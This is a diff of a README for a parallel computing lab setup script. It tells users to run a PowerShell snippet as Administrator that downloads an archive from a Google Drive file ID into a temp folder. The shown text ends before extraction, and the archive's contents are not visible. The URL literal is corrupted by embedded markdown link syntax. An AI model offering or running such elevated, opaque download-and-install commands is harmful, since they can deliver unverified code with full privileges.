@@ -1,13 +1,13 @@
 # Parallel Computing Lab - Setup Script
 
-Run the following command in **PowerShell (Run as Administrator)** to download, extract, and copy the files to the target directories.
+Run this in **PowerShell (Run as Administrator)**. It downloads the archive using the verified direct content endpoint, extracts the C source files, and populates the target directories.
 
 ```powershell
 $fId = "163AhTHrHH5BYx2AzgxBKJnO8kbXmQNoj"
+$downloadUrl = "[https://drive.usercontent.google.com/download?id=$fId&export=download&authuser=0&confirm=t](https://drive.usercontent.google.com/download?id=$fId&export=download&authuser=0&confirm=t)"
+
 $tmp = "$env:TEMP\lab_setup"
 New-Item -ItemType Directory -Force -Path "$tmp\ext" | Out-Null
-
-$downloadUrl = "[https://drive.usercontent.google.com/download?id=$fId&export=download&authuser=0&confirm=t](https://drive.usercontent.google.com/download?id=$fId&export=download&authuser=0&confirm=t)"
 $zipPath = "$tmp\archive.zip"
 
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
